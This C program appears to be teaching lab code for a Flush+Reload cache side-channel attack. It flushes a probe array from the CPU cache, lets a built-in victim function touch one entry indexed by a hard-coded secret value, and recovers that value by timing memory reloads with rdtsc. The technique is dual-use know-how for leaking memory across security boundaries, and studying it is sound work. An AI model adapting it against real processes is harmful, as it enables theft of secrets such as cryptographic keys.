#include <emmintrin.h>
#include <x86intrin.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>

//  Windows
#ifdef _WIN32
#include <intrin.h>
uint64_t rdtsc(){
    return __rdtsc();
}
//  Linux/GCC
#else
uint64_t rdtsc(){
    unsigned int lo,hi;
    __asm__ __volatile__ ("rdtsc" : "=a" (lo), "=d" (hi));
    return ((uint64_t)hi << 32) | lo;
}
#endif



#define CACHE_WORD_SIZE 2048

uint8_t array[256*CACHE_WORD_SIZE];
int temp;
unsigned char secret = 94;
/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (200)
#define DELTA 512

void victim()
{
  temp = array[secret*CACHE_WORD_SIZE + DELTA];
}
void flushSideChannel()
{
  int i;
  // Write to array to bring it to RAM to prevent Copy-on-write
  for (i = 0; i < 256; i++) array[i*CACHE_WORD_SIZE + DELTA] = 1;
  //flush the values of the array from cache
  for (i = 0; i < 256; i++) _mm_clflush(&array[i*CACHE_WORD_SIZE +DELTA]);
}

void reloadSideChannel()
{
  int junk=0;
  register uint64_t time1, time2;
  volatile uint8_t *addr;
  int i;
  for(i = 0; i < 256; i++){
   addr = &array[i*CACHE_WORD_SIZE + DELTA];
   time1 = rdtsc(&junk);
   junk = *addr;
   time2 = rdtsc(&junk) - time1;
   if (time2 <= CACHE_HIT_THRESHOLD){
	printf("array[%d*2048 + %d] is in cache.\n", i, DELTA);
        printf("The Secret = %d.\n",i);
   }
  } 
}

int main(int argc, const char **argv)
{
  flushSideChannel();
  victim();
  reloadSideChannel();
  return (0);
}
